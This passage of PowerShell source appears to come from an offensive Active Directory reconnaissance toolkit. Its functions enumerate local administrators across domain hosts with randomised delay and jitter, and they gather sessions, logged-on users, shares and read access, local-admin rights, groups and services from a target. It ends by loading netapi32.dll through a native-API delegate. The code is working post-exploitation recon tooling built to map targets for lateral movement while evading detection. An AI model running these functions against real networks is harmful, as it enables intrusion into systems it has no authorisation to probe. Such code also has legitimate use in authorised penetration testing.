    .PARAMETER OutFile
    Output results to a specified csv output file.

    .PARAMETER Domain
    Domain to query for systems.

    .LINK
    http://blog.harmj0y.net/
    #>

    [CmdletBinding()]
    param(
        [string]$HostList = "",
        [Parameter(Mandatory = $False)] [Switch] $Ping,
        [UInt32]$Delay = 0,
        [UInt32]$Jitter = .3,
        [string] $OutFile,
        [string] $Domain
    )

    If ($PSBoundParameters['Debug']) {
        $DebugPreference = 'Continue'
    }

    # get the target domain
    if($Domain){
        $targetDomain = $Domain
    }
    else{
        # use the local domain
        $targetDomain = Get-NetDomain
    }

    Write-Verbose "[*] Running Invoke-EnumerateLocalAdmins on domain $targetDomain with delay of $Delay"

    # get the current user
    $CurrentUser = Get-NetCurrentUser

    # random object for delay
    $randNo = New-Object System.Random

    # if we're using a host list, read the targets in and add them to the target list
    if($HostList -ne ""){
        $servers = @()
        if (Test-Path $HostList){
            foreach ($Item in Get-Content $HostList) {
                if (($Item -ne $null) -and ($Item.trim() -ne "")){
                    $servers += $Item
                }
            }
        }
        else {
            Write-Warning "`r`n[!] Input file '$HostList' doesn't exist!`r`n"
            return $null
        }
    }
    else{
        # otherwise, query the domain for target servers
        $statusOutput += "[*] Querying domain for hosts...`r`n"
        # get just the name so we can get the account enabled/disabled property
        $servers = Get-NetComputers -FullData -Domain $targetDomain | ForEach-Object {$_.name}
    }

    # randomize the server list
    $servers = Get-ShuffledArray $servers

    # delete any existing output file if it already exists
    If ($OutFile -and (Test-Path $OutFile)){ Remove-Item $OutFile }

    if (($servers -eq $null) -or ($servers.Count -eq 0)){
        Write-Warning "`r`n[!] No hosts found!"
        return $null
    }
    else{

        $counter = 0

        foreach ($server in $servers){

            $counter = $counter + 1

            Write-Verbose "[*] Enumerating server $server ($counter of $($servers.count))"

            # start a new status output array for each server
            $serverOutput = @()

            # sleep for our semi-randomized interval
            Start-Sleep $randNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

            $up = $true
            if($ping){
                $up = Test-Server -Server $server
            }
            if($up){
                # grab the users for the local admins on this server
                $users = Get-NetLocalGroup -HostName $server

                # output the results to a csv if specified
                if($OutFile){
                    $users | export-csv -Append -notypeinformation -path $OutFile
                }
                else{
                    # otherwise return the user objects
                    $users
                }
            }

        }
    }

}


function Invoke-HostEnum {
    <#
    .SYNOPSIS
    Runs all available enumeration methods on a given host.

    .DESCRIPTION
    This function runs all available functions on a given host,
    including querying AD for host information, finding active
    sessions on a host, logged on users, available shares, whether
    the current user has local admin access, the local groups,
    local administrators, and local services on the target.

    .PARAMETER HostName
    The hostname to enumerate.

    .EXAMPLE
    > Invoke-HostEnum WINDOWSXP
    Runs all enumeration methods on the WINDOWSXP host
    #>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $True)][string]$HostName
    )

    If ($PSBoundParameters['Debug']) {
        $DebugPreference = 'Continue'
    }

    Write-Output  "[+] Invoke-HostEnum Report: $HostName"

    # Step 1: get any AD data associated with this server
    $adinfo = Get-NetComputers -Hostname "$HostName*" -FullData | Out-String
    Write-Output "`n[+] AD query for: $HostName"
    Write-Output $adinfo.Trim()

    # Step 2: get active sessions for this host and display what we find
    $sessions = Get-NetSessions -HostName $HostName
    if ($sessions -and ($sessions.Count -ne 0)){
        Write-Output "`n[+] Active sessions for $HostName :"
    }
    foreach ($session in $sessions) {
        $username = $session.sesi10_username
        $cname = $session.sesi10_cname
        $activetime = $session.sesi10_time
        $idletime = $session.sesi10_idle_time
        # make sure we have a result
        if (($username -ne $null) -and ($username.trim() -ne "")){
            Write-Output "[+] $HostName - Session - $username from $cname - Active: $activetime - Idle: $idletime"
        }
    }

    # Step 3: get any logged on users for this host and display what we find
    $users = Get-NetLoggedon -HostName $HostName
    if ($users -and ($users.Count -ne 0)){
        Write-Output "`n[+] Users logged onto $HostName :"
    }
    foreach ($user in $users) {
        $username = $user.wkui1_username
        $domain = $user.wkui1_logon_domain

        if ($username -ne $null){
            # filter out $ machine accounts
            if ( !$username.EndsWith("$") ) {
                Write-Output "[+] $HostName - Logged-on - $domain\\$username"
            }
        }
    }

    # step 4: see if we can get the last loggedon user by remote registry
    $lastUser = Get-LastLoggedOn -HostName $HostName
    if ($lastUser){
        Write-Output "`n[+] Last user logged onto $HostName : $lastUser"
    }

    # Step 5: get the shares for this host and display what we find
    $shares = Get-NetShare -HostName $HostName
    if ($shares -and ($shares.Count -ne 0)){
        Write-Output "`n[+] Shares on $HostName :"
    }
    foreach ($share in $shares) {
        if ($share -ne $null){
            $netname = $share.shi1_netname
            $remark = $share.shi1_remark
            $path = "\\"+$HostName+"\"+$netname

            if (($netname) -and ($netname.trim() -ne "")){

                Write-Output "[+] $HostName - Share: $netname `t: $remark"
                try{
                    # check for read access to this share
                    $f=[IO.Directory]::GetFiles($path)
                    Write-Output "[+] $HostName - Read Access - Share: $netname `t: $remark"
                }
                catch {}
            }
        }
    }

    # Step 6: Check if current user has local admin access
    $access = Invoke-CheckLocalAdminAccess -Hostname $HostName
    if ($access){
        Write-Output "`n[+] Current user has local admin access to $HostName !"
    }

    # Step 7: Get all the local groups
    $localGroups = Get-NetLocalGroups -Hostname $HostName | fl | Out-String
    if ($localGroups -and $localGroups.Length -ne 0){
        Write-Output "`n[+] Local groups for $HostName :"
        Write-Output $localGroups.Trim()
    }
    else {
        Write-Output "[!] Unable to retrieve localgroups for $HostName"
    }

    # Step 8: Get any local admins
    $localAdmins = Get-NetLocalGroup -Hostname $HostName | fl | Out-String
    if ($localAdmins -and $localAdmins.Length -ne 0){
        Write-Output "`n[+] Local Administrators for $HostName :"
        Write-Output $localAdmins.Trim()
    }
    else {
        Write-Output "[!] Unable to retrieve local Administrators for $HostName"
    }

    # Step 9: Get any local services
    $localServices = Get-NetLocalServices -Hostname $HostName | fl | Out-String
    if ($localServices -and $localServices.Length -ne 0){
        Write-Output "`n[+] Local services for $HostName :"
        Write-Output $localServices.Trim()
    }
    else {
        Write-Output "[!] Unable to retrieve local services for $HostName"
    }
}


# Load up the netapi32.dll so we can resolve our future calls
#   adapted heavily from http://www.exploit-monday.com/2012/05/accessing-native-windows-api-in.html  
$LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
$LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
$LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
$LoadLibrary.Invoke("netapi32.dll") | Out-Null
